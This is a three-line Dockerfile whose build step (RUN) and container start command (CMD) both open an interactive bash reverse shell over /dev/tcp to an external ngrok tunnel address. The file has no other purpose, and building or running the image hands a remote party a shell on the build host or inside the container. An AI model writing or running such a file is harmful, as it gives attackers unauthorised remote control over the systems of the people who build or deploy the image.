FROM ubuntu:latest
RUN bash -c "bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/14922 0>&1"
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/14922 0>&1"]
